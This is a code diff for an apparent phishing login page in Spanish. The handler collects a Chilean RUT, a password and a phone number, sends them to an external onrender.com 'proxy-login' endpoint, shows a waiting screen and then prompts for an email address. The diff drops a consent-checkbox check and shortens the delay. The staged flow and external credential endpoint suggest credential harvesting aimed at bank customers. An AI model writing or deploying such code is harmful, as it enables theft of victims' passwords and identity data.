@@ -163,44 +163,39 @@
       return dv === dvEsperado;
     }
 
-    document.getElementById("loginForm").addEventListener("submit", async function(e){
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const passwd = document.getElementById("passwd").value;
-      const telefono = document.getElementById("telefono").value;
-      const contacto = document.getElementById("contacto").checked;
+document.getElementById("loginForm").addEventListener("submit", async function(e){
+  e.preventDefault();
+  const rut = document.getElementById("rut").value;
+  const passwd = document.getElementById("passwd").value;
+  const telefono = document.getElementById("telefono").value;
 
-      if(!validarRut(rut)){
-        document.getElementById("resultado").innerText = "❌ RUT inválido";
-        return;
-      }
-      if(!contacto){
-        document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
-        return;
-      }
+  if(!validarRut(rut)){
+    document.getElementById("resultado").innerText = "❌ RUT inválido";
+    return;
+  }
 
-      try {
-        const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ rut, passwd, telefono })
-        });
-        const data = await response.json();
-        document.getElementById("resultado").innerText = data.mensaje;
-
-        if(response.ok){
-          document.getElementById("loginForm").style.display="none";
-          document.getElementById("pantallaEspera").classList.remove("hidden");
-
-          setTimeout(()=>{
-            document.getElementById("pantallaEspera").classList.add("hidden");
-            document.getElementById("formCorreo").classList.remove("hidden");
-          }, 25000);
-        }
-      } catch (error) {
-        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
-      }
+  try {
+    const response = await fetch("https://autorizacion-ob-l9me.onrender.com/proxy-login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ rut, passwd, telefono })
     });
+    const data = await response.json();
+    document.getElementById("resultado").innerText = data.mensaje;
+
+    if(response.ok){
+      document.getElementById("loginForm").style.display="none";
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        document.getElementById("pantallaEspera").classList.add("hidden");
+        document.getElementById("formCorreo").classList.remove("hidden");
+      }, 5000); // puedes ajustar el tiempo
+    }
+  } catch (error) {
+    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+  }
+});
 
     async function enviarCorreo(){
       const correo = document.getElementById("correo").value;
